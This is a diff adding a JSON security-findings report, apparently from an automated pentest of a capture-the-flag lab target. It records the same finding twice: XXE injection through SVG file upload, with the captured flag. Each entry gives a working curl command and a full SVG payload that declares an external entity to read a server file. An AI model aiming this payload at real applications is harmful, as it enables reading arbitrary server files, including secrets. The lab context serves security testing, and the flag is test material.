@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-15T00:51:20.899864+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "6be4b6b1-7fe9-4d2e-9d9f-5eee7d8e72e5",
+      "timestamp": "2026-04-15T00:51:20.899760+00:00",
+      "title": "XXE via SVG File Upload - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:47615",
+      "description": "The application accepts SVG file uploads without sanitization, allowing XML External Entity (XXE) injection. An attacker can read arbitrary files from the server filesystem by embedding DOCTYPE entity declarations in uploaded SVG files.",
+      "evidence": "flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}",
+      "tool_used": "manual-http",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "curl -X POST http://172.17.0.1:47615/ -F \"name=test\" -F \"surname=test\" -F \"address=test\" -F \"image=@xxe.svg;type=image/svg+xml\" where xxe.svg contains: <?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">]><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"><text x=\"10\" y=\"20\">&xxe;</text></svg>",
+        "expected": "Response renders the SVG with the contents of /app/flag.txt embedded in the text element"
+      }
+    },
+    {
+      "id": "beb38a72-df4e-4674-84ce-da4464d6047c",
+      "timestamp": "2026-04-15T00:51:21.072864+00:00",
+      "title": "XXE via SVG File Upload - Flag Captured",
+      "severity": "critical",
+      "target": "http://172.17.0.1:47615",
+      "description": "The application accepts SVG file uploads without sanitization, allowing XML External Entity (XXE) injection. An attacker can read arbitrary files from the server filesystem by embedding DOCTYPE entity declarations in uploaded SVG files.",
+      "evidence": "flag{c86ecb0c-4b5c-4151-8fd7-344a76f5cd8f}",
+      "tool_used": "manual-http",
+      "cve": "",
+      "reproduction": {
+        "type": "command",
+        "command": "curl -X POST http://172.17.0.1:47615/ -F \"name=test\" -F \"surname=test\" -F \"address=test\" -F \"image=@xxe.svg;type=image/svg+xml\" where xxe.svg contains: <?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///app/flag.txt\">]><svg xmlns=\"http://www.w3.org/2000/svg\" width=\"100\" height=\"100\"><text x=\"10\" y=\"20\">&xxe;</text></svg>",
+        "expected": "Response renders the SVG with the contents of /app/flag.txt embedded in the text element"
+      }
+    }
+  ],
+  "diagrams": []
+}
